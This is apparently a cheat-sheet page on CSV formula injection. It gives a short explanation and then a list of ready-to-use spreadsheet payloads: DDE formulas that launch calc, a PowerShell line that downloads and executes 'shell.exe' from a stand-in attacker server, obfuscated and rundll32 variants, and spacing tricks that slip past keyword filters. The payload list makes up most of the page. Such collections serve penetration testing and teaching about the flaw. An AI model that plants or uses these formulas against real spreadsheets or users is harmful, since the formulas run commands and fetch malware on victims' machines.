# CSV Injection

> Many web applications allow the user to download content such as templates for invoices or user settings to a CSV file. Many users choose to open the CSV file in either Excel, Libre Office or Open Office. When a web application does not properly validate the contents of the CSV file, it could lead to contents of a cell or many cells being executed.


## Summary

* [Methodology](#methodology)
* [References](#references)


## Methodology

Basic exploits with **Dynamic Data Exchange**.

* Spawn a calc
    ```powershell
    DDE ("cmd";"/C calc";"!A0")A0
    @SUM(1+1)*cmd|' /C calc'!A0
    =2+5+cmd|' /C calc'!A0
    =cmd|' /C calc'!'A1'
    ```

* PowerShell download and execute
    ```powershell
    =cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
    ```

* Prefix obfuscation and command chaining
    ```powershell
    =AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A
    =cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A
    +thespanishinquisition(cmd|'/c calc.exe'!A
    =         cmd|'/c calc.exe'!A
    ```

* Using rundll32 instead of cmd
    ```powershell
    =rundll32|'URL.dll,OpenURL calc.exe'!A
    =rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A
    ```

* Using null characters to bypass dictionary filters. Since they are not spaces, they are ignored when executed.
    ```powershell
    =    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A
    ```

Technical details of the above payloads:

- `cmd` is the name the server can respond to whenever a client is trying to access the server
- `/C` calc is the file name which in our case is the calc(i.e the calc.exe)
- `!A0` is the item name that specifies unit of data that a server can respond when the client is requesting the data


Any formula can be started with

```powershell
=
+
–
@
```


## References

- [CSV Excel Macro Injection - Timo Goosen, Albinowax - Jun 21, 2022](https://owasp.org/www-community/attacks/CSV_Injection)
- [CSV Excel formula injection - Google Bug Hunter University - May 22, 2022](https://bughunters.google.com/learn/invalid-reports/google-products/4965108570390528/csv-formula-injection)
- [CSV Injection – A Guide To Protecting CSV Files - Akansha Kesharwani - 30/11/2017](https://payatu.com/csv-injection-basic-to-exploit/)
- [From CSV to Meterpreter - Adam Chester - November 05, 2015](https://blog.xpnsec.com/from-csv-to-meterpreter/)
- [The Absurdly Underestimated Dangers of CSV Injection - George Mauer - 7 October, 2017](http://georgemauer.net/2017/10/07/csv-injection.html)
- [Three New DDE Obfuscation Methods - ReversingLabs - September 24, 2018](https://blog.reversinglabs.com/blog/cvs-dde-exploits-and-obfuscation)
- [Your Excel Sheets Are Not Safe! Here's How to Beat CSV Injection - we45 - October 5, 2020](https://www.we45.com/post/your-excel-sheets-are-not-safe-heres-how-to-beat-csv-injection)